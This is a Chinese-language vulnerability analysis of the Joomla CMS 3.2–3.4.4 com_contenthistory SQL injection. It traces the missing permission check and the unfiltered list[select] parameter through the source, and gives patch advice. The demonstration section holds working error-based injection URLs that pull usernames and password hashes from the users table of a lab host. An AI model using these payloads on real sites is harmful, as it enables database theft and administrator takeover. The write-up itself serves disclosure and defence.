# Joomla CMS 3.2-3.4.4 SQL注入 漏洞分析

昨日，Joomla CMS发布新版本3.4.5，该版本修复了一个高危的SQL注入漏洞，3.2至3.4.4版本都受到影响。攻击者通过该漏洞可以直接获取获取数据库中敏感信息，甚至可以获取已登陆的管理员会话直接进入网站后台。

0x01 原理分析
=========

* * *

在 Joomla CMS 中有一个查看历史编辑版本的组件(com_contenthistory)，该功能本应只有管理员才能访问，但是由于开发人员的疏忽，导致该功能的访问并不需要相应的权限。通过访问`/index.php?option=com_contenthistory`可以使得服务端加载历史版本处理组件。程序流程会转到`/components/com_contenthistory/contenthistory.php`文件中：

```
<?php
defined('_JEXEC') or die;    

$lang = JFactory::getLanguage();
$lang->load('com_contenthistory', JPATH_ADMINISTRATOR, null, false, true)
||    $lang->load('com_contenthistory', JPATH_SITE, null, false, true);    

require_once JPATH_COMPONENT_ADMINISTRATOR . '/contenthistory.php';

```

可以看到该组件加载时并没有进行相关权限的监测，而 Joomla 中，一般的后台调用组件 (`/administrator/components/`下的组件) 都会进行组件对应的权限检查，例如后台中的`com_contact`组件

```
if (!JFactory::getUser()->authorise('core.manage', 'com_contact'))
{
    return JError::raiseWarning(404, JText::_('JERROR_ALERTNOAUTHOR'));
}

```

但是，程序在处理`contenthistory`组件时，并没有进行一个权限检查，程序初始化并设置好组件相关配置后，包含文件`/administrator/components/com_contenthistory/contenthistory.php`，其内容如下：

```
<?php
defined('_JEXEC') or die;    

$controller = JControllerLegacy::getInstance('Contenthistory', array('base_path' => JPATH_COMPONENT_ADMINISTRATOR));
$controller->execute(JFactory::getApplication()->input->get('task'));
$controller->redirect();

```

程序初始化基于`contenthistory`组件的控制类`JControllerLegacy`，然后直接调用控制类的`execute()`方法，在`execute()`方法中，会调用其控制类中的`display()`，代码位于`/libraries/legacy/controller/legacy.php`：

```
public function display($cachable = false, $urlparams = array())
{
    $document = JFactory::getDocument();
    $viewType = $document->getType();
    $viewName = $this->input->get('view', $this->default_view);
    $viewLayout = $this->input->get('layout', 'default', 'string');    

    $view = $this->getView($viewName, $viewType, '', array('base_path' => $this->basePath, 'layout' => $viewLayout));    

    // Get/Create the model
    if ($model = $this->getModel($viewName))
    {
        // Push the model into the view (as default)
        $view->setModel($model, true);
    }
    (...省略...)
    if ($cachable && $viewType != 'feed' && $conf->get('caching') >= 1)
    { (...省略...) }
    else
    {
        $view->display();
    }    

    return $this;
}

```

处理程序从传递的参数中获取`view`和`layout`的参数值进行初始化视图，并且调用`$model = $this->getModel($viewName)`加载对应数据模型，最终会调用`$view->display()`函数进行视图处理。

Joomla 新版本 3.4.5 中修复的SQL注入漏洞涉及的是历史查看操作，也就是`view=history`时的程序处理会导致注入。在程序进行数据提取时，会进入`/administrator/components/com_contenthistory/models/history.php`文件中的`getListQuery()`函数：

```
protected function getListQuery()
{
    // Create a new query object.
    $db = $this->getDbo();
    $query = $db->getQuery(true);    

    // Select the required fields from the table.
    $query->select(
        $this->getState(
            'list.select',
            'h.version_id, h.ucm_item_id, h.ucm_type_id, h.version_note, h.save_date, h.editor_user_id,' .
            'h.character_count, h.sha1_hash, h.version_data, h.keep_forever'
        )
    )
    ->from($db->quoteName('#__ucm_history') . ' AS h')
    ->where($db->quoteName('h.ucm_item_id') . ' = ' . $this->getState('item_id'))
    ->where($db->quoteName('h.ucm_type_id') . ' = ' . $this->getState('type_id'))    

    // Join over the users for the editor
    ->select('uc.name AS editor')
    ->join('LEFT', '#__users AS uc ON uc.id = h.editor_user_id');    

    // Add the list ordering clause.
    $orderCol = $this->state->get('list.ordering');
    $orderDirn = $this->state->get('list.direction');
    $query->order($db->quoteName($orderCol) . $orderDirn);    

    return $query;
}

```

注意下面这段SQL语句构造部分：

```
    $query->select(
        $this->getState(
            'list.select',
            'h.version_id, h.ucm_item_id, h.ucm_type_id, h.version_note, h.save_date, h.editor_user_id,' .
            'h.character_count, h.sha1_hash, h.version_data, h.keep_forever'
        )
    )
    ->from($db->quoteName('#__ucm_history') . ' AS h')
    ->where($db->quoteName('h.ucm_item_id') . ' = ' . $this->getState('item_id'))
    ->where($db->quoteName('h.ucm_type_id') . ' = ' . $this->getState('type_id'))

```

其中`getState()`函数用于获取模型的属性和其对应的值，其函数定义位于`/ibraries/legacy/model/legacy.php`：

```
public function getState($property = null, $default = null)
{
    if (!$this->__state_set)
    {
        // Protected method to auto-populate the model state.
        $this->populateState();    

        // Set the model state set flag to true.
        $this->__state_set = true;
    }    

    return $property === null ? $this->state : $this->state->get($property, $default);
}

```

然后会调用`populateState()`函数来初始化参数值和提取并过滤某些参数，在`contenthistory`组建中定义有自己的`populateState()`函数：

```
protected function populateState($ordering = null, $direction = null)
{
    (...省略...)
    // List state information.
    parent::populateState('h.save_date', 'DESC');
}

```

函数最后，会调用父类的`populateState()`函数，因为该数据模型继承于 JModelList，所以父类相关代码位于`/libraries/legacy/model/list.php`中，而在父类该函数的处理中会解析请求中传递的`list[]`参数，解析并过滤预设键的值，但是却忽略了`list[select]`：

```
protected function populateState($ordering = null, $direction = null)
{
    (...省略...)
        // Receive & set list options
        if ($list = $app->getUserStateFromRequest($this->context . '.list', 'list', array(), 'array'))
        {
            foreach ($list as $name => $value)
            {
                // Extra validations
                switch ($name)
                {
                    case 'fullordering':
                        (...省略...)
                    case 'ordering':
                        (...省略...)
                    case 'direction':
                        (...省略...)
                    case 'limit':
                        (...省略...)
                    default:
                        $value = $value;
                        break;
                }    

                $this->setState('list.' . $name, $value);
            }
        }
    (...省略...)

```

而传递`list[select]`参数值最终会被解析到上述组件视图进行处理时 SQL 语句构建中的`list.select`里，从而导致了注入。

0x02 漏洞演示
=========

* * *

通过上面简单的分析，已经知道了受影响的 Joomla 版本中，`contenthistory`组件访问不受权限的控制，并且当进行`view=history`请求时会解析请求参数中`list[select]`的值拼接到 SQL 语句中。下面是该漏洞的简单验证和利用方法。

_1.漏洞验证_

> http://http://172.16.96.130/xampp/Joomla-3.4.4/index.php?option=com_contenthistory&view=history&list[select]=1

因为在进行 SQL 语句拼接的时候，获取了`list.ordering`进行数据查询中的`order`操作，若不提供默认会将其设置为数据进行处理，相关处理位于`/libraries/joomla/database/driver.php`的 quoteName() 函数中。

因此，访问上述构造的URL，服务器会报错：

![](http://drops.javaweb.org/uploads/images/d1bd8bf075d60f56670c45e2e757f9e3c8258a81.jpg)

_2.漏洞利用_

因为在 SQL 语句拼接时，程序框架针对每个`from`或者`where`操作进行了换行处理，所以这里并不能使用`#`、`--`等符号来注释掉后面的语句，只能通过报错注入进行数据提取。但是语句的成功执行有一定的前提条件，也就是传递的`item_id`和`type_id`参数值必须于数据库中有效，同时传递`list[ordering]`参数 (空值即可)，这样注入的语句才能够得到执行，从而进行报错注入。

这里经过多个漏洞站点的测试可以简单的使用`item_id=1&type_id=1`，当然了为了准确性和有效性，可以通过爆破的方式来得到这两个参数的有效值，然后再进行注入操作。

(Tips：Joomla 中构造的 SQL 语句中`#_`最终会在执行前被替换为表前缀)

下面是获取用户名/密码哈希的漏洞演示过程：

> http://http://172.16.96.130/xampp/Joomla-3.4.4/index.php?option=com_contenthistory&view=history&item_id=1&type_id=1&list[ordering]&list[select]=(select 1 from (select count(_),concat((select username from %23__users limit 0,1),floor(rand(0)_2)) from information_schema.tables group by 2)x)

![](http://drops.javaweb.org/uploads/images/b6e0c9a20e968ba47bb3bdbee96aa2059f42f519.jpg)

> http://172.16.96.130/xampp/Joomla-3.4.4/index.php?option=com_contenthistory&view=history&item_id=1&type_id=1&list[ordering]&list[select]=(select 1 from (select count(_),concat((select password from %23__users limit 0,1),floor(rand(0)_2)) from information_schema.tables group by 2)x)

![](http://drops.javaweb.org/uploads/images/552541a7fb69b74ee212bf80dba575af24ca25f2.jpg)

0x03 修复方案
=========

* * *

1.  从[https://github.com/joomla/joomla-cms/releases](https://github.com/joomla/joomla-cms/releases)获取最新版本进行重新安装；
2.  从[https://github.com/joomla/joomla-cms/releases](https://github.com/joomla/joomla-cms/releases)下载相应版本的补丁程序进行升级；

0x04 总结
=======

* * *

就 Joomla CMS 的用户量来看，目前还有大量的站点的数据正受到该漏洞的威胁。该漏洞的产生本质上是由于访问控制的缺失和过滤不严格造成。访问控制的缺失导致本应只有管理员才能进行访问和加载的`contenthistory`组件能够被任意用户访问和加载，而参数的过滤不严格，导致攻击者能够构造出恶意的参数到执行流中产生注入。

0x05 参考
=======

*   [http://www.sebug.net/vuldb/ssvid-89680](http://www.sebug.net/vuldb/ssvid-89680)
*   [https://blog.sucuri.net/2015/10/joomla-3-4-5-released-fixing-a-serious-sql-injection-vulnerability.html](https://blog.sucuri.net/2015/10/joomla-3-4-5-released-fixing-a-serious-sql-injection-vulnerability.html)
*   [https://www.trustwave.com/Resources/SpiderLabs-Blog/Joomla-SQL-Injection-Vulnerability-Exploit-Results-in-Full-Administrative-Access/](https://www.trustwave.com/Resources/SpiderLabs-Blog/Joomla-SQL-Injection-Vulnerability-Exploit-Results-in-Full-Administrative-Access/)

原文地址：[http://blog.knownsec.com/2015/10/joomla-cms-3-2-3-4-4-sql-injection-vulnerability/](http://blog.knownsec.com/2015/10/joomla-cms-3-2-3-4-4-sql-injection-vulnerability/)